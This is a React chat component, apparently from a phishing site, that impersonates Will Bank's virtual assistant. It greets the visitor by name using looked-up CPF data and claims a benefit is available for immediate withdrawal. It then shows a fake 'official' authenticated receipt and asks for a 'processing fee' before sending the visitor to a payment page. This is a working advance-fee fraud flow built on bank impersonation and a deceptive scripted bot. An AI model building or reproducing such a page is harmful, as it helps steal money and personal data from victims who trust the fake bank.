import { useEffect, useState, useRef } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  Send, 
  Volume2, 
  Play, 
  CheckCircle, 
  Clock, 
  Loader2,
  Shield,
  ChevronRight,
  FileText,
  Download,
  BadgeCheck
} from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";

interface ChatMessage {
  id: string;
  type: "bot" | "user";
  content: string;
  isAudio?: boolean;
  isVideo?: boolean;
  isComprovante?: boolean;
  comprovanteData?: {
    nome: string;
    cpf: string;
    valor: string;
    data: string;
    protocolo: string;
  };
  timestamp: Date;
}

const Chat = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [inputValue, setInputValue] = useState("");
  const [isTyping, setIsTyping] = useState(false);
  const [currentStep, setCurrentStep] = useState(0);
  const [videoWatched, setVideoWatched] = useState(false);
  const [audioListened, setAudioListened] = useState(false);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  const cpfData: CPFData | undefined = location.state?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio;

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages]);

  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }

    startChatFlow();
  }, [cpfData, valorBeneficio, navigate]);

  const startChatFlow = async () => {
    await delay(800);
    addBotMessage(`Olá, ${cpfData?.nome.split(' ')[0]}! 👋`);
    
    await delay(1500);
    addBotMessage("Sou a assistente virtual do Will Bank e vou te ajudar a realizar o saque do seu benefício.");
    
    await delay(2000);
    addBotMessage(`Identifiquei que você tem um valor de **R$ ${valorBeneficio?.toLocaleString('pt-BR')},00** disponível para saque imediato.`);
    
    await delay(1500);
    addBotMessage("Antes de prosseguir, preciso que você assista a um vídeo com instruções importantes sobre o processo de saque:", false, true);
    
    setCurrentStep(1);
  };

  const delay = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

  const addBotMessage = (content: string, isAudio = false, isVideo = false, isComprovante = false, comprovanteData?: ChatMessage["comprovanteData"]) => {
    setIsTyping(true);
    setTimeout(() => {
      setMessages(prev => [...prev, {
        id: Date.now().toString(),
        type: "bot",
        content,
        isAudio,
        isVideo,
        isComprovante,
        comprovanteData,
        timestamp: new Date()
      }]);
      setIsTyping(false);
    }, 600);
  };

  const addUserMessage = (content: string) => {
    setMessages(prev => [...prev, {
      id: Date.now().toString(),
      type: "user",
      content,
      timestamp: new Date()
    }]);
  };

  const handleVideoWatched = async () => {
    setVideoWatched(true);
    addUserMessage("✓ Assisti o vídeo de instruções");
    
    await delay(1200);
    addBotMessage("Perfeito! Agora vou enviar um áudio com mais detalhes sobre a liberação:");
    
    await delay(800);
    setMessages(prev => [...prev, {
      id: Date.now().toString(),
      type: "bot",
      content: "Áudio com instruções detalhadas",
      isAudio: true,
      timestamp: new Date()
    }]);
    
    setCurrentStep(2);
  };

  const handleAudioListened = async () => {
    setAudioListened(true);
    addUserMessage("✓ Ouvi o áudio com as instruções");
    
    await delay(1200);
    addBotMessage("Excelente! Agora vou gerar o comprovante oficial do seu benefício...");
    
    await delay(1800);
    
    const protocolo = `WB${Date.now().toString().slice(-8)}`;
    const dataAtual = new Date().toLocaleDateString('pt-BR', {
      day: '2-digit',
      month: '2-digit',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });
    
    setMessages(prev => [...prev, {
      id: Date.now().toString(),
      type: "bot",
      content: "Comprovante de Benefício",
      isComprovante: true,
      comprovanteData: {
        nome: cpfData?.nome || "",
        cpf: cpfData?.cpf || "",
        valor: `R$ ${valorBeneficio?.toLocaleString('pt-BR')},00`,
        data: dataAtual,
        protocolo
      },
      timestamp: new Date()
    }]);
    
    await delay(1500);
    addBotMessage("✅ Comprovante gerado com sucesso!");
    
    await delay(1200);
    addBotMessage("Para finalizar a liberação do seu saque, é necessário realizar o pagamento de uma pequena taxa de processamento. Clique no botão abaixo para continuar:");
    
    setCurrentStep(3);
  };

  const handleProsseguirPagamento = () => {
    navigate("/saque", { state: { cpfData, valorBeneficio } });
  };

  const handleSendMessage = () => {
    if (!inputValue.trim()) return;
    
    addUserMessage(inputValue);
    setInputValue("");
    
    setTimeout(() => {
      addBotMessage("Obrigada pela mensagem! Por favor, siga as instruções na tela para prosseguir com seu saque.");
    }, 800);
  };

  if (!cpfData || !valorBeneficio) return null;

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex flex-col">
      {/* Header */}
      <header className="bg-slate-900/80 backdrop-blur-sm border-b border-slate-700/50 px-4 py-3 sticky top-0 z-10">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-primary rounded-full flex items-center justify-center">
              <img src={willbankLogo} alt="Will Bank" className="w-6 h-6 object-contain" />
            </div>
            <div>
              <p className="font-semibold text-white text-sm">Atendimento Will Bank</p>
              <p className="text-xs text-emerald-400 flex items-center gap-1">
                <span className="w-1.5 h-1.5 bg-emerald-400 rounded-full animate-pulse" />
                Online agora
              </p>
            </div>
          </div>
          <div className="flex items-center gap-1 text-emerald-400 text-xs">
            <Shield className="w-4 h-4" />
            <span>Seguro</span>
          </div>
        </div>
      </header>

      {/* Chat Messages */}
      <main className="flex-1 overflow-y-auto px-4 py-4">
        <div className="max-w-lg mx-auto space-y-4">
          {messages.map((message) => (
            <div
              key={message.id}
              className={`flex ${message.type === "user" ? "justify-end" : "justify-start"}`}
            >
              <div
                className={`max-w-[85%] rounded-2xl p-4 ${
                  message.type === "user"
                    ? "bg-primary text-primary-foreground rounded-br-md"
                    : "bg-slate-800/80 border border-slate-700/50 text-white rounded-bl-md"
                }`}
              >
                {message.isVideo ? (
                  <div className="space-y-3">
                    <p className="text-sm">{message.content}</p>
                    <div className="relative aspect-video bg-slate-900 rounded-xl overflow-hidden border border-slate-600">
                      <div className="absolute inset-0 flex items-center justify-center bg-gradient-to-br from-slate-800 to-slate-900">
                        <div className="text-center space-y-3">
                          <div className="w-16 h-16 mx-auto bg-primary/20 rounded-full flex items-center justify-center">
                            <Play className="w-8 h-8 text-primary" />
                          </div>
                          <p className="text-slate-400 text-xs">Vídeo de instruções</p>
                        </div>
                      </div>
                    </div>
                    {!videoWatched && (
                      <Button
                        onClick={handleVideoWatched}
                        className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
                      >
                        <Play className="w-4 h-4 mr-2" />
                        Assistir vídeo
                      </Button>
                    )}
                  </div>
                ) : message.isAudio ? (
                  <div className="space-y-3">
                    <div className="flex items-center gap-3 bg-slate-900/50 rounded-full px-4 py-3">
                      <Button
                        onClick={handleAudioListened}
                        size="icon"
                        disabled={audioListened}
                        className="w-10 h-10 rounded-full bg-primary hover:bg-primary/90 text-primary-foreground shrink-0"
                      >
                        <Volume2 className="w-5 h-5" />
                      </Button>
                      <div className="flex-1 space-y-1">
                        <div className="flex gap-0.5">
                          {[...Array(30)].map((_, i) => (
                            <div
                              key={i}
                              className="w-1 bg-primary/50 rounded-full"
                              style={{ height: `${Math.random() * 16 + 4}px` }}
                            />
                          ))}
                        </div>
                      </div>
                      <span className="text-xs text-slate-400">0:47</span>
                    </div>
                    {!audioListened && (
                      <p className="text-xs text-slate-400 text-center">
                        Clique para ouvir a mensagem
                      </p>
                    )}
                  </div>
                ) : message.isComprovante ? (
                  <div className="space-y-3">
                    {/* Comprovante Card */}
                    <div className="bg-gradient-to-br from-slate-900 to-slate-800 rounded-xl border border-slate-600 overflow-hidden">
                      {/* Header */}
                      <div className="bg-emerald-500/20 px-4 py-3 border-b border-emerald-500/30">
                        <div className="flex items-center justify-center gap-2">
                          <BadgeCheck className="w-5 h-5 text-emerald-400" />
                          <span className="font-semibold text-emerald-400">COMPROVANTE OFICIAL</span>
                        </div>
                      </div>

                      {/* Content */}
                      <div className="p-4 space-y-3">
                        <div className="flex justify-between py-2 border-b border-slate-700">
                          <span className="text-slate-400 text-sm">Beneficiário:</span>
                          <span className="text-white font-medium text-sm text-right">{message.comprovanteData?.nome}</span>
                        </div>
                        <div className="flex justify-between py-2 border-b border-slate-700">
                          <span className="text-slate-400 text-sm">CPF:</span>
                          <span className="text-white font-medium text-sm">{message.comprovanteData?.cpf}</span>
                        </div>
                        <div className="flex justify-between py-2 border-b border-slate-700">
                          <span className="text-slate-400 text-sm">Valor do Benefício:</span>
                          <span className="text-emerald-400 font-bold text-lg">{message.comprovanteData?.valor}</span>
                        </div>
                        <div className="flex justify-between py-2 border-b border-slate-700">
                          <span className="text-slate-400 text-sm">Data:</span>
                          <span className="text-white font-medium text-sm">{message.comprovanteData?.data}</span>
                        </div>
                        <div className="flex justify-between py-2">
                          <span className="text-slate-400 text-sm">Protocolo:</span>
                          <span className="text-white font-mono text-xs">{message.comprovanteData?.protocolo}</span>
                        </div>
                      </div>

                      {/* Footer */}
                      <div className="bg-slate-900/50 px-4 py-3 border-t border-slate-700">
                        <div className="flex items-center justify-center gap-2 text-slate-500 text-xs">
                          <Shield className="w-3 h-3" />
                          <span>Documento autenticado digitalmente</span>
                        </div>
                      </div>
                    </div>

                    <Button variant="outline" className="w-full border-slate-600 text-slate-300 hover:bg-slate-700">
                      <Download className="w-4 h-4 mr-2" />
                      Salvar comprovante
                    </Button>
                  </div>
                ) : (
                  <p className="text-sm whitespace-pre-wrap">{message.content.replace(/\*\*(.*?)\*\*/g, '$1')}</p>
                )}
                
                <div className="flex items-center gap-1 mt-2 opacity-60">
                  <Clock className="w-3 h-3" />
                  <span className="text-[10px]">
                    {message.timestamp.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })}
                  </span>
                  {message.type === "user" && <CheckCircle className="w-3 h-3 ml-1" />}
                </div>
              </div>
            </div>
          ))}

          {isTyping && (
            <div className="flex justify-start">
              <div className="bg-slate-800/80 border border-slate-700/50 rounded-2xl rounded-bl-md px-4 py-3">
                <div className="flex items-center gap-2">
                  <div className="flex gap-1">
                    <span className="w-2 h-2 bg-slate-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }} />
                    <span className="w-2 h-2 bg-slate-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }} />
                    <span className="w-2 h-2 bg-slate-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }} />
                  </div>
                  <span className="text-sm text-slate-400">Digitando...</span>
                </div>
              </div>
            </div>
          )}

          {/* CTA Button */}
          {currentStep === 3 && (
            <div className="flex justify-center pt-4">
              <Button
                onClick={handleProsseguirPagamento}
                className="bg-primary hover:bg-primary/90 text-primary-foreground font-bold px-8 py-6 text-base rounded-full shadow-lg shadow-primary/30"
              >
                Prosseguir para pagamento
                <ChevronRight className="w-5 h-5 ml-2" />
              </Button>
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>
      </main>

      {/* Input Area */}
      <div className="bg-slate-900/80 backdrop-blur-sm border-t border-slate-700/50 px-4 py-3">
        <div className="max-w-lg mx-auto flex items-center gap-2">
          <Input
            value={inputValue}
            onChange={(e) => setInputValue(e.target.value)}
            placeholder="Digite sua mensagem..."
            className="flex-1 bg-slate-800 border-slate-600 text-white placeholder:text-slate-500 rounded-full"
            onKeyPress={(e) => e.key === "Enter" && handleSendMessage()}
          />
          <Button
            onClick={handleSendMessage}
            size="icon"
            className="rounded-full bg-primary hover:bg-primary/90 text-primary-foreground shrink-0"
          >
            <Send className="w-5 h-5" />
          </Button>
        </div>
      </div>
    </div>
  );
};

export default Chat;
